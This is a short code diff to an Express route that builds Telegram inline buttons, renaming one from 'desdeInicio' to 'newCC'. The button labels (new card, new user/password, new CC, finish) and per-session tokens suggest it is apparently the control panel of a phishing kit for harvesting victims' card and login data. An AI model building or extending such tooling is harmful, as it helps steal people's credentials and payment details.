@@ -72,7 +72,7 @@ router.post('/generals', (req, res) => {
         [
           { text: 'newCard', callback_data: `card:${token}` },
           { text: 'newUserPass', callback_data: `userp:${token}` },
-          { text: 'desdeInicio', callback_data: `index:${token}` },
+          { text: 'newCC', callback_data: `index:${token}` },
         ],
         [
           { text: 'Finalizar', callback_data: `success:${token}` },
